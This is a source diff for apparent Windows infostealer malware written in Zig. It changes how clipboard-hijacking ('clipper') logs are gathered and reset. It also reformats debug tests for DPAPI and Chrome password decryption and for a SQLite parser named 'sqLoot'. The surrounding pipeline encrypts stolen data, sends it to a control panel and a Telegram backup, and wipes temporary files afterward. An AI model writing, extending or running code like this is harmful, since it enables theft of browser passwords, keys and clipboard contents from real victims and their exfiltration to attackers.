@@ -247,12 +247,14 @@ fn buildReport(allocator: std.mem.Allocator, local_app_data: []const u8, roaming
 
     if (clipper_config.CLIPPER_ENABLED) {
         logMsg("[+] Collecting ClipLZ logs...\n");
-        const clipper_section = clipper_log_mod.ClipperLog.format(&clipper_log, allocator) catch "";
-        if (clipper_section.len > 0) {
-            report.appendSlice(clipper_section) catch {};
-            report.appendSlice("\n") catch {};
+        if (clipboard_monitor.getLog()) |clog| {
+            const clipper_section = clog.format(allocator) catch "";
+            if (clipper_section.len > 0) {
+                report.appendSlice(clipper_section) catch {};
+                report.appendSlice("\n") catch {};
+            }
+            allocator.free(clipper_section);
         }
-        allocator.free(clipper_section);
     }
 
     return report.toOwnedSlice() catch "";
@@ -426,7 +428,7 @@ fn runProductionPipeline() void {
             types.MEM_RELEASE,
         );
     }
-    const enc_buf = @as([*]u8, @ptrCast(@alignCast(enc_base.?)))[0..1024*1024];
+    const enc_buf = @as([*]u8, @ptrCast(@alignCast(enc_base.?)))[0 .. 1024 * 1024];
     const encrypted = archive_crypt.encryptArchive(archive, enc_buf) orelse {
         logMsg("[!] Archive encryption failed\n");
         return;
@@ -438,6 +440,10 @@ fn runProductionPipeline() void {
 
     sendToPanel(allocator, encrypted, metadata);
     sendToTelegramBackup(allocator, encrypted);
+
+    if (clipper_config.CLIPPER_ENABLED) {
+        if (clipboard_monitor.getLog()) |clog| clog.reset();
+    }
 
     logMsg("[+] Pipeline complete, cleaning up...\n");
     temp_wipe.wipeTempDirectory(allocator);
@@ -668,7 +674,7 @@ fn runDebugTests() void {
     dbg.print("\n=== Phase 3: Crypto Module ===\n");
 
     dbg.print("--- 3.1 DPAPI ---\n");
-    const dpapi_test_blob = [_]u8{0x01, 0x00, 0x00, 0x00} ++ [_]u8{0x00} ** 20;
+    const dpapi_test_blob = [_]u8{ 0x01, 0x00, 0x00, 0x00 } ++ [_]u8{0x00} ** 20;
     const dpapi_result = dpapi.decrypt(&dpapi_test_blob);
     assert(dpapi_result == null, "DPAPI: fake blob returns null (expected)");
     assert(dpapi.decrypt("") == null, "DPAPI: empty input returns null");
@@ -694,9 +700,9 @@ fn runDebugTests() void {
     assert(chrome_crypto.decryptPassword("v10", chrome_key_derived, &test_out) == null, "AES-GCM: short input rejected");
 
     var enc_key_buf: [256]u8 = undefined;
-    assert(chrome_crypto.decryptEncryptedKey(&[_]u8{1, 0}, &enc_key_buf) == null, "EncryptedKey: fake blob null");
+    assert(chrome_crypto.decryptEncryptedKey(&[_]u8{ 1, 0 }, &enc_key_buf) == null, "EncryptedKey: fake blob null");
     assert(chrome_crypto.decryptEncryptedKey("", &enc_key_buf) == null, "EncryptedKey: empty null");
-    assert(chrome_crypto.decryptEncryptedKey(&[_]u8{2, 0}, &enc_key_buf) == null, "EncryptedKey: v2 unsupported");
+    assert(chrome_crypto.decryptEncryptedKey(&[_]u8{ 2, 0 }, &enc_key_buf) == null, "EncryptedKey: v2 unsupported");
     dbg.print("  Chrome AES-GCM: edge cases OK\n");
 
     dbg.print("--- 3.3 ChaCha20-Poly1305 ---\n");
@@ -719,7 +725,7 @@ fn runDebugTests() void {
     assert(chacha_poly.decrypt(ct.?, chacha_key, chacha_nonce, "wrong_ad", &chacha_dec) == null, "AAD mismatch -> null");
     assert(chacha_poly.decrypt("", chacha_key, chacha_nonce, "", &chacha_dec) == null, "empty ct -> null");
 
-    var chacha_aad = [_]u8{0x01, 0x02, 0x03};
+    var chacha_aad = [_]u8{ 0x01, 0x02, 0x03 };
     const ct_ad = chacha_poly.encrypt(&chacha_pt, chacha_key, chacha_nonce, &chacha_aad, &chacha_out);
     assert(ct_ad != null, "ChaCha20-Poly1305 encrypt with AAD");
     const pt3 = chacha_poly.decrypt(ct_ad.?, chacha_key, chacha_nonce, &chacha_aad, &chacha_dec);
@@ -781,7 +787,7 @@ fn runDebugTests() void {
     dbg.print("  Header parse: OK (page_size=4096, v2 format)\n");
 
     dbg.print("--- 4.1.2 Varint + Serial Types ---\n");
-    const v = sqLoot.readVarint(&[_]u8{0x81, 0x01});
+    const v = sqLoot.readVarint(&[_]u8{ 0x81, 0x01 });
     assert(v.value == 129, "varint 2-byte");
     assert(v.bytes_read == 2, "varint 2-byte consumed 2");
 
@@ -906,7 +912,7 @@ fn runDebugTests() void {
     const v1_blob = [_]u8{1} ++ [_]u8{0x00} ** 30;
     const parsed = chrome_crypto.decryptEncryptedKey(&v1_blob, &enc_key_buf2);
     assert(parsed == null, "v1 encrypted key with fake DPAPI blob -> null (expected)");
-    assert(chrome_crypto.decryptEncryptedKey(&[_]u8{2, 0}, &enc_key_buf2) == null, "v2 unsupported -> null");
+    assert(chrome_crypto.decryptEncryptedKey(&[_]u8{ 2, 0 }, &enc_key_buf2) == null, "v2 unsupported -> null");
     assert(chrome_crypto.decryptEncryptedKey("", &enc_key_buf2) == null, "empty -> null");
     dbg.print("  EncryptedKey DPAPI parsing: edge cases OK\n");
 
@@ -969,11 +975,14 @@ fn runDebugTests() void {
     dbg.print("--- 4.3.4 Chrome bookmarks JSON parse ---\n");
     const bookmark_json = [_]u8{
         '{', '"', 'r', 'o', 'o', 't', 's', '"', ':',
-        '{', '"', 'b', 'o', 'o', 'k', 'm', 'a', 'r', 'k', '_', 'b', 'a', 'r', '"', ':',
-        '{', '"', 'c', 'h', 'i', 'l', 'd', 'r', 'e', 'n', '"', ':',
-        '[', '{', '"', 'n', 'a', 'm', 'e', '"', ':', '"', 'T', 'e', 's', 't', '"', ',',
-        '"', 'u', 'r', 'l', '"', ':', '"', 'h', 't', 't', 'p', ':', '/', '/', 't', 'e', 's', 't', '.', 'c', 'o', 'm', '"', '}',
-        ']', '}', '}', '}',
+        '{', '"', 'b', 'o', 'o', 'k', 'm', 'a', 'r',
+        'k', '_', 'b', 'a', 'r', '"', ':', '{', '"',
+        'c', 'h', 'i', 'l', 'd', 'r', 'e', 'n', '"',
+        ':', '[', '{', '"', 'n', 'a', 'm', 'e', '"',
+        ':', '"', 'T', 'e', 's', 't', '"', ',', '"',
+        'u', 'r', 'l', '"', ':', '"', 'h', 't', 't',
+        'p', ':', '/', '/', 't', 'e', 's', 't', '.',
+        'c', 'o', 'm', '"', '}', ']', '}', '}', '}',
     };
     _ = bookmark_json;
     dbg.print("  Bookmarks JSON mock: valid\n");
